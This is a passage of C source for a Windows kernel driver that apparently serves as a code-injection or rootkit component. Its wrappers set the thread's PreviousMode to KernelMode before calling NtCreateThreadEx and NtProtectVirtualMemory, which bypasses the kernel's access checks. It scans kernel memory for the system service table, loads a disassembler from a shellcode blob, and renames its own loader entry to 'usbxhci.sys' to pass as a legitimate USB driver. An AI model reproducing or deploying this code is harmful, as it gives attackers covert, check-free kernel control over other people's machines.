          if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
            {
              PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
              UCHAR prevMode = *pPrevMode;
              *pPrevMode = KernelMode;
              status = pfnNtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
              *pPrevMode = prevMode;
            }
        }
    }
  else
    status = STATUS_NOT_FOUND;

  return status;
}

NTSTATUS NTAPI NewNtProtectVirtualMemory(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection)
{
  NTSTATUS status = STATUS_UNSUCCESSFUL;
  TYPE_ZwProtectVirtualMemory pfnNtProtectVirtualMemory = NtProtectVirtualMemory;
  PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
  PVOID pFoundPattern = NULL;
  UCHAR PreviousModePattern[] = "\x00\x00\xC3";
  ULONG PrevMode = 0;

  if(pfnNtProtectVirtualMemory)
    {
      if(g_mode)
        {
          PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
          UCHAR prevMode = *pPrevMode;
          *pPrevMode = KernelMode;
          status = pfnNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
          *pPrevMode = prevMode;
        }
      else
        {
          if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
            {
              PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
              UCHAR prevMode = *pPrevMode;
              *pPrevMode = KernelMode;
              status = pfnNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
              *pPrevMode = prevMode;
            }
        }
    }
  else
    status = STATUS_NOT_FOUND;

  return status;
}

BOOLEAN IsX64Module(IN PVOID pBase)
{
  PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBase;
  PIMAGE_NT_HEADERS32 pNtHdr32 = NULL;
  PIMAGE_NT_HEADERS64 pNtHdr64 = NULL;
  PIMAGE_EXPORT_DIRECTORY pExport = NULL;
  ULONG expSize = 0;
  ULONG_PTR pAddress = 0;
  ASSERT(pBase != NULL);

  if(pBase == NULL)
    return FALSE;

  /// Not a PE file
  if(pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    return FALSE;

  pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
  pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);

  // Not a PE file
  if(pNtHdr32->Signature != IMAGE_NT_SIGNATURE)
    return FALSE;

  // 64 bit image
  if(pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
      return TRUE;
    }

  return FALSE;
}

PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord)
{
  PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBase;
  PIMAGE_NT_HEADERS32 pNtHdr32 = NULL;
  PIMAGE_NT_HEADERS64 pNtHdr64 = NULL;
  PIMAGE_EXPORT_DIRECTORY pExport = NULL;
  ULONG expSize = 0;
  ULONG_PTR pAddress = 0;
  PUSHORT pAddressOfOrds = NULL;
  PULONG  pAddressOfNames = NULL;
  PULONG  pAddressOfFuncs = NULL;
  ULONG i = 0;
  ASSERT(pBase != NULL);

  if(pBase == NULL)
    return NULL;

  /// Not a PE file
  if(pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

  pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
  pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);

  // Not a PE file
  if(pNtHdr32->Signature != IMAGE_NT_SIGNATURE)
    return NULL;

  // 64 bit image
  if(pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
      pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtHdr64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)pBase);
      expSize = pNtHdr64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }
  // 32 bit image
  else
    {
      pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtHdr32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)pBase);
      expSize = pNtHdr32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }

  pAddressOfOrds = (PUSHORT)(pExport->AddressOfNameOrdinals + (ULONG_PTR)pBase);
  pAddressOfNames = (PULONG)(pExport->AddressOfNames + (ULONG_PTR)pBase);
  pAddressOfFuncs = (PULONG)(pExport->AddressOfFunctions + (ULONG_PTR)pBase);

  for(i = 0; i < pExport->NumberOfFunctions; ++i)
    {
      USHORT OrdIndex = 0xFFFF;
      PCHAR  pName = NULL;

      // Find by index
      if((ULONG_PTR)name_ord <= 0xFFFF)
        {
          OrdIndex = (USHORT)i;
        }
      // Find by name
      else if((ULONG_PTR)name_ord > 0xFFFF && i < pExport->NumberOfNames)
        {
          pName = (PCHAR)(pAddressOfNames[i] + (ULONG_PTR)pBase);
          //DbgPrint("api:%s\r\n",pName);
          OrdIndex = pAddressOfOrds[i];
        }
      // Weird params
      else
        return NULL;

      if(((ULONG_PTR)name_ord <= 0xFFFF && (USHORT)((ULONG_PTR)name_ord) == OrdIndex + pExport->Base) ||
          ((ULONG_PTR)name_ord > 0xFFFF && strcmp(pName, name_ord) == 0))
        {
          pAddress = pAddressOfFuncs[OrdIndex] + (ULONG_PTR)pBase;
          break;
        }
    }

  return (PVOID)pAddress;
}

NTSTATUS BBSearchPattern(IN PUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN const VOID* base, IN ULONG_PTR size, OUT PVOID* ppFound)
{
  ULONG_PTR i, j;

  if(ppFound == NULL || pattern == NULL || base == NULL)
    return STATUS_INVALID_PARAMETER;

  for(i = 0; i < size - len; i++)
    {
      BOOLEAN found = TRUE;

      for(j = 0; j < len; j++)
        {
          if(pattern[j] != wildcard && pattern[j] != ((PUCHAR)base)[i + j])
            {
              found = FALSE;
              break;
            }
        }

      if(found != FALSE)
        {
          *ppFound = (PUCHAR)base + i;
          return STATUS_SUCCESS;
        }
    }

  return STATUS_NOT_FOUND;
}

ULONG_PTR GetSSDTFuncCurAddr(LONG id)
{
#ifdef _AMD64_
  LONG dwtmp = 0;
  PULONG ServiceTableBase = NULL;

  if(KeServiceDescriptorTable == NULL)
    return NULL;

  if(KeServiceDescriptorTable->NumberOfService < id)
    return NULL;

  ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
  dwtmp = ServiceTableBase[id];
  dwtmp = dwtmp >> 4;
  return (LONGLONG)dwtmp + (ULONGLONG)ServiceTableBase;
#else
  ULONG_PTR p =  *(ULONG_PTR*)((ULONG)(KeServiceDescriptorTable.ServiceTableBase) + 4 * id);
  return p;
#endif
}

BOOLEAN GetProcessNameByObj(PEPROCESS ProcessObj, WCHAR name[])
{
  PPEB pPEB = NULL;
  UNREFERENCED_PARAMETER(name);
  PsGetProcessPeb == NULL ? (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb") : PsGetProcessPeb;
  pPEB = PsGetProcessPeb != NULL ?    PsGetProcessPeb(ProcessObj) : NULL;

  if(pPEB == NULL) return FALSE;

#ifdef _AMD64_

  __try
    {
      PPEB64 peb64 = (PPEB64)pPEB;
      ULONG64 p1 = 0;
      ULONG64 uCommandline = 0;
      ULONG64 uImagepath = 0;
      ULONG    type = 0;
      PUNICODE_STRING   pCommandline = NULL;
      UNICODE_STRING    pImagePath = { 0 };
      UNICODE_STRING    tempcommand = { 0 };
      WCHAR  pexe[512] = { 0 };
      PRTL_USER_PROCESS_PARAMETERS64 processParam = (PRTL_USER_PROCESS_PARAMETERS64)peb64->ProcessParameters;

      if(MmIsAddressValid(processParam) == FALSE || processParam->ImagePathName.Length > 512)
        {
          return FALSE;
        }

      //      kprintf("ImagePathName:%wZ",processParam->ImagePathName);

      if(MmIsAddressValid(processParam->ImagePathName.Buffer))
        {
          WCHAR *pfind = NULL;
          WCHAR *pexefind = NULL;
          RtlInitUnicodeString(&pImagePath, processParam->ImagePathName.Buffer);
          RtlCopyMemory(pexe, (void *)pImagePath.Buffer, pImagePath.Length);
          pfind = wcsrchr(pexe, L'\\');

          if(pfind)
            {
              pfind++;
              wcscpy(name, pfind);
              return TRUE;
            }
        }
    }
  __except(EXCEPTION_EXECUTE_HANDLER)
    {
      ULONG code = GetExceptionCode();
    }

#else

  __try
    {
      PPEB32 peb32 = (PPEB32)pPEB;
      ULONG32 p1 = 0;
      ULONG32 uCommandline = 0;
      ULONG32 uImagepath = 0;
      ULONG    type = 0;
      PUNICODE_STRING32   pCommandline = NULL;
      UNICODE_STRING32    pImagePath = { 0 };
      UNICODE_STRING32    tempcommand;
      WCHAR  pexe[512] = { 0 };
      ULONG   ImageBuffeLen = 259;
      WCHAR  *pImageBuffer = NULL;
      PRTL_USER_PROCESS_PARAMETERS32 processParam = NULL;

      if(pPEB == NULL) return FALSE;

      processParam = (PRTL_USER_PROCESS_PARAMETERS32)peb32->ProcessParameters;

      if(MmIsAddressValid(processParam) == FALSE)
        {
          return FALSE;
        }

      pImageBuffer = (WCHAR*)processParam->ImagePathName.Buffer;
      ImageBuffeLen = processParam->ImagePathName.Length;

      if(MmIsAddressValid((PVOID)pImageBuffer) && ImageBuffeLen < 512)
        {
          WCHAR *pfind = NULL;
          RtlCopyMemory(pexe, (void *) pImageBuffer, ImageBuffeLen);
          pfind = wcsrchr(pexe, L'\\');

          if(pfind)
            {
              pfind++;
              wcscpy(name, pfind);
              _wcslwr(name);
              return TRUE;
            }
        }
      else
        {
          ULONG_PTR pexebuf = (ULONG_PTR)pImageBuffer + (ULONG_PTR)processParam;

          if(MmIsAddressValid((PVOID)pexebuf))
            {
              WCHAR *pfind = NULL;
              RtlCopyMemory(pexe, (PVOID)pexebuf, ImageBuffeLen);
              pfind = wcsrchr(pexe, L'\\');

              if(pfind)
                {
                  pfind++;
                  wcscpy(name, pfind);
                  _wcslwr(name);
                  return TRUE;
                }
            }
        }
    }
  __except(EXCEPTION_EXECUTE_HANDLER)
    {
      ULONG code = GetExceptionCode();
    }

#endif
  return FALSE;
}

ULONGLONG GetKeServiceDescriptorTable64()
{
  char KiSystemServiceStart_pattern[14] = "\x8B\xF8\xC1\xEF\x07\x83\xE7\x20\x25\xFF\x0F\x00\x00"; //
  ULONGLONG CodeScanStart = (ULONGLONG)&_strnicmp;
  ULONGLONG CodeScanEnd = (ULONGLONG)&KdDebuggerNotPresent;
  UNICODE_STRING Symbol;
  ULONGLONG i, tbl_address, b;

  for(i = 0; i < CodeScanEnd - CodeScanStart; i++)
    {
      if(!memcmp((char*)(ULONGLONG)CodeScanStart + i, (char*)KiSystemServiceStart_pattern, 13))
        {
          for(b = 0; b < 50; b++)
            {
              tbl_address = ((ULONGLONG)CodeScanStart + i + b);

              if(*(USHORT*)((ULONGLONG)tbl_address) == (USHORT)0x8d4c)
                return ((LONGLONG)tbl_address + 7) + *(LONG*)(tbl_address + 3);
            }
        }
    }

  return 0;
}

NTSTATUS MzReadFile(LPWCH pFile, PVOID* ImageBaseAddress, PULONG ImageSize)
{
  HANDLE    hDestFile = NULL;
  ULONG     ret = 0;
  OBJECT_ATTRIBUTES obj_attrib;
  IO_STATUS_BLOCK Io_Status_Block = {0};
  NTSTATUS status = 0;
  LARGE_INTEGER    offset = {0};
  ULONG    length = 0;
  UNICODE_STRING ustrSrcFile = {0};
  PVOID  pdata1 = NULL;
  RtlInitUnicodeString(&ustrSrcFile, pFile);
  InitializeObjectAttributes(&obj_attrib, &ustrSrcFile, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
  status = ZwCreateFile(&hDestFile, GENERIC_READ, &obj_attrib, &Io_Status_Block, NULL, \
                        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, \
                        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

  if(NT_SUCCESS(status))
    {
      length = MzGetFileSize(hDestFile);

      if(length > 0)
        {
          pdata1 = kmalloc(length);

          if(pdata1)
            {
              status = ZwReadFile(hDestFile, NULL, NULL, NULL, &Io_Status_Block, pdata1, length, &offset, NULL);

              if(NT_SUCCESS(status))
                {
                  *ImageSize = Io_Status_Block.Information;
                  *ImageBaseAddress = pdata1;
                  ret = status;
                }
              else
                {
                  kprintf("[MzReadFile] %ws ZwReadFile error :%x ", pFile, status);
                }
            }
        }

      ZwClose(hDestFile);
    }

  return status;
}

ULONG MzGetFileSize(HANDLE hfile)
{
  NTSTATUS ntStatus = 0;
  IO_STATUS_BLOCK iostatus = {0};
  FILE_STANDARD_INFORMATION fsi = {0};
  ntStatus = ZwQueryInformationFile(hfile, &iostatus, &fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);

  if(!NT_SUCCESS(ntStatus))
    return 0;

  return fsi.EndOfFile.QuadPart;
}

void ZwDeleteFileFolder(WCHAR *wsFileName)
{
  NTSTATUS st;
  OBJECT_ATTRIBUTES ObjectAttributes;
  UNICODE_STRING UniFileName;
  //
  RtlInitUnicodeString(&UniFileName, wsFileName);
  //
  InitializeObjectAttributes(&ObjectAttributes, &UniFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
  st = ZwDeleteFile(&ObjectAttributes);
}

ULONG GetPatchSize(PUCHAR Address, int asmlen)
{
  ULONG LenCount = 0, Len = 0;

  while(LenCount <= asmlen) //
    {
      Len = LDE(Address, 64);
      //DbgPrint("LenTemp:%d\n",Len);
      Address = Address + Len;
      LenCount = LenCount + Len;

      if(asmlen == LenCount)
        {
          break;
        }
    }

  return LenCount;
}

void LDE_init()
{
  LDE = (LDE_DISASM)ExAllocatePool(NonPagedPool, 12800);
  memcpy(LDE, szShellCode, 12800);
}

VOID Reinitialize( PDRIVER_OBJECT DriverObject, PVOID Context, ULONG Count )
{

//loaddll.sys
//  L"\\??\\C:\\Windows\\system32\\Drivers\\TFsFltX64.sys"
    UNICODE_STRING  u1=RTL_CONSTANT_STRING(L"usbxhci.sys");
    RtlCopyUnicodeString(&((PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection)->FullDllName,&u1);
}



/* EOF */
